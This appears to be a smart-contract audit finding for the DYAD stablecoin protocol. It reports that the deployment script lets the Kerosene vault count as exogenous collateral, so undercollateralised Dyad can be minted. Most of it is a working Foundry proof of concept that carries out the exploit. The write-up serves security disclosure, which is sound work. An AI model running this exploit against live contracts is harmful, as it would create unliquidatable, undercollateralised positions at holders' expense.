# Lines of code

https://github.com/code-423n4/2024-04-dyad/blob/main/script/deploy/Deploy.V2.s.sol#L95
https://github.com/code-423n4/2024-04-dyad/blob/main/src/core/VaultManagerV2.sol#L75
https://github.com/code-423n4/2024-04-dyad/blob/main/src/core/VaultManagerV2.sol#L165


# Vulnerability details

## Impact
The deployment script `DeployV2` adds the Kerosene vault `unboundedKerosineVault` to the `VaultManagerV2::vaultLicenser`.

```solidity
vaultLicenser.add(address(unboundedKerosineVault));
```

Because of this, the Kerosene vault can be added to an NFT as an exogenous vault using `VaultManagerV2::add`.

In this case, the `VaultManagerV2::mintDyad` function will count the Kerosene vault as exogenous collateral and allow Dyad to be minted backed by the Kerosene collateral. This is contrary to the intention to have: 

["Each DYAD stablecoin is backed by at least $1.50 of exogenous collateral."](https://dyadstable.notion.site/DYAD-design-outline-v6-3fa96f99425e458abbe574f67b795145)

This allows users to create positions which cannot be liquidated because they appear to be properly collateralised when they are actually undercollateralised, being backed only by Kerosene.

## Proof of Concept
Place in `test/fork/SubmissionTest.sol` and run with: 
`forge test --match-contract SubmissionTest --rpc-url RPC-URL`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/console.sol";
import "forge-std/Test.sol";

import {DeployV2, Contracts} from "../../script/deploy/Deploy.V2.s.sol";
import {Licenser} from "../../src/core/Licenser.sol";
import {Parameters} from "../../src/params/Parameters.sol";
import {DNft} from "../../src/core/DNft.sol";
import {Dyad} from "../../src/core/Dyad.sol";
import {WETH} from "../WETH.sol";
import {ERC20Mock} from "../ERC20Mock.sol";
import {OracleMock} from "../OracleMock.sol";
import {Vault} from "../../src/core/Vault.sol";
import {IDyad} from "../../src/interfaces/IDyad.sol";
import {IVaultManager} from "../../src/interfaces/IVaultManager.sol";
import {Licenser} from "../../src/core/Licenser.sol";
import {Kerosine} from "../../src/staking/Kerosine.sol";

contract SubmissionTest is Test, Parameters {

  Contracts contracts;
  DNft dNft;
  WETH weth;
  ERC20Mock wsteth;
  Dyad dyad;
  Kerosine kerosene;

  address alice;
  address bob;

  function setUp() public {
    contracts = new DeployV2().run();
    dNft = DNft(MAINNET_DNFT);
    weth = WETH(payable(MAINNET_WETH));
    wsteth = ERC20Mock(payable(MAINNET_WSTETH));
    dyad = Dyad(MAINNET_DYAD);
    kerosene = Kerosine(MAINNET_KEROSENE);

    alice = vm.addr(123123);
    vm.deal(alice, 100 ether);

    bob = vm.addr(1231234);
    vm.deal(bob, 100 ether);
  }

  /**
   * Users can add Kerosene vaults as exogenous vaults to their NFTs which allows them to mint Dyad which is 
   * subsequently not backed by 150% exogenous capital.
   */
  function testAddingKeroseneVaultsExogenous() public {

    address vaultManagerAddress = address(contracts.vaultManager);
    address unboundedKeroAddress = address(contracts.unboundedKerosineVault);
    address wethVaultAddress = address(contracts.ethVault);

    // in order to mint Dyad
    Licenser licenser = dyad.licenser();
    vm.prank(MAINNET_OWNER);
    licenser.add(address(contracts.vaultManager));

    // add exogenous vault as Bob to give Kerosene some value
    vm.deal(bob, 10000 ether);
    vm.startPrank(bob);
    uint bobNFT = dNft.mintNft{value: 1 ether}(bob);
    weth.deposit{value: 9000 ether}(); 
    weth.approve(vaultManagerAddress, 9000 ether);
    contracts.vaultManager.deposit(bobNFT, wethVaultAddress, 9000 ether);
    contracts.vaultManager.add(bobNFT, wethVaultAddress);
    contracts.vaultManager.mintDyad(bobNFT, 1 ether, bob);
    vm.stopPrank();

    // add Kerosene vault to alice's NFT
    vm.startPrank(alice);
    uint aliceNFT = dNft.mintNft{value: 1 ether}(alice);

    deal(address(MAINNET_KEROSENE), alice, 5 ether); 
    assertEq(kerosene.balanceOf(alice), 5 ether, "Alice should have 5 Kerosene");

    kerosene.approve(vaultManagerAddress, 1 ether);
    contracts.vaultManager.deposit(aliceNFT, unboundedKeroAddress, 1 ether);

    // the unbounded kerosene vault has only been added to the vault's Licenser
    // so it can only be added as an exogenous vault
    contracts.vaultManager.add(aliceNFT, unboundedKeroAddress);

    // we cannot add Kerosene vault as a Kerosene vault
    vm.expectRevert(IVaultManager.VaultNotLicensed.selector);
    contracts.vaultManager.addKerosene(aliceNFT, unboundedKeroAddress);

    // collateral in kerosene vault is counted as non-kerosene collateral 
    uint value = contracts.vaultManager.getNonKeroseneValue(aliceNFT);
    assertGt(value, .5 ether, 'Kerosene vault should be considered exogenous collateral');

    // mint Dyad using the kerosene collateral, not exogenous collateral
    contracts.vaultManager.mintDyad(aliceNFT, .33 ether, alice);
    uint aliceDyad = dyad.balanceOf(alice);
    assertEq(aliceDyad, .33 ether, "Alice should have .33 Dyad");
  }
}
```

